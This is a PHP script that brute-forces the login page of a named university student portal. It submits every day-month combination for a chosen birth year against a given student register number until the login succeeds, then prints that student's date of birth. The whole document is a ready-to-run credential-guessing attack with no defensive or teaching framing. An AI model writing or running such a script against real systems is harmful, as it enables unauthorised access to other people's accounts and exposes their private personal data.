<?php
$reg='115015123'; //change to the Register number you wish
$yr='1995'; //Change to the Expected year of birth
$f=0;
function login($i,$j)
{
$ch = curl_init();
set_time_limit(0);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch,CURLOPT_URL,"http://webstream.sastra.edu/sastrapwi/usermanager/youLogin.jsp");
curl_setopt($ch,CURLOPT_POST,true);
curl_setopt($ch,CURLOPT_COOKIEFILE,'JSESSIONID');
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,"txtRegNumber=iamalsouser&txtPwd=thanksandregards&txtSN={$i}&txtPD={$j}&txtPA=1");
curl_setopt($ch,CURLOPT_REFERER,"http://webstream.sastra.edu/sastrapwi/usermanager/youLogin.jsp");
$home = curl_exec($ch);
curl_close($ch);
if(strstr($home,'test'))
return true;
else
false;
}
for($i=1;$i<=12;$i++)
{
  for($j=1;$j<=31;$j++)
	{
		if($i<10) $m='0'.$i;
		else $m=''.$i;
		if($j<10) $d='0'.$j;
		else $d=''.$j;
		$pass=$d.$m.$yr;
		if(login($reg,$pass))
		{
		echo "DOB is: {$d}-{$m}-{$yr}";
		$f=1;
		break;
		}
	}
	if($f==1)
	break;
}
if($f==0)
echo "Not this year.. try some other year..";
?>
